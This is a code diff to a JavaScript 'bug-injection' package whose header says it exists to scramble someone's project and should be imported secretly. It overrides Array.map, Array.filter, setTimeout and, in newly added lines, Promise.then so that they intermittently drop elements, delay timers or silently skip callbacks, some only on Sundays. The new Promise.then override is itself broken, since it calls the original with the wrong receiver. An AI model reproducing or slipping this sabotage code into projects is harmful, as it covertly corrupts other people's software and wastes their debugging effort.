@@ -3,7 +3,7 @@
  * @version 0.0.1
  * @author wheatup
  * 
- * @disclaimer The purpose of this package is to scramble someone's project and produces bug.
+ * @disclaimer The purpose of this package is to scramble someone's project and produces bugs.
  * 			Remember import this package secretly.
  * 			The author of this package does not participate any of injections!
  * @disclaimer_zh 本包用于给项目不定期制造BUG用，请私密地引入本包。本包的作者不参与传播、注入。
@@ -26,25 +26,25 @@
 
 	/**
 	 * Array.map will always be missing the last element on Sundays
-	 * @zh 当周日时，map方法的结果总是会丢失最后一个元素
+	 * @zh 当周日时，Array.map方法的结果总是会丢失最后一个元素
 	 */
 	const _map = Array.prototype.map;
 	Array.prototype.map = function (...args) {
 		result = _map.call(this, ...args);
 		if (new Date().getDay() === 0) {
-			result.splice(this.length - 1, 1);
+			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
 	}
 
 	/**
 	 * Array.fillter has 10% chance to lose the final element
-	 * @zh filter的结果有10%的概率丢失最后一个元素
+	 * @zh Array.filter的结果有2%的概率丢失最后一个元素
 	 */
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
 		result = _filter.call(this, ...args);
-		if(Math.random() < 0.1) {
+		if (Math.random() < 0.02) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -57,5 +57,18 @@
 	const _timeout = window.setTimeout;
 	window.setTimeout = function (handler, timeout, ...args) {
 		return _timeout.call(window, handler, +timeout + 250, ...args);
+	}
+
+	/**
+	 * Promise.then has a 10% chance will not register on Sundays
+	 * @zh Promise.then 在周日时有10%不会注册
+	 */
+	const _then = Promise.prototype.then;
+	Promise.prototype.then = function(fn, ...args) {
+		if(new Date().getDay() === 0 && Math.random() < 0.1) {
+			return;
+		} else {
+			_then.call(fn, ...args);
+		}
 	}
 })();
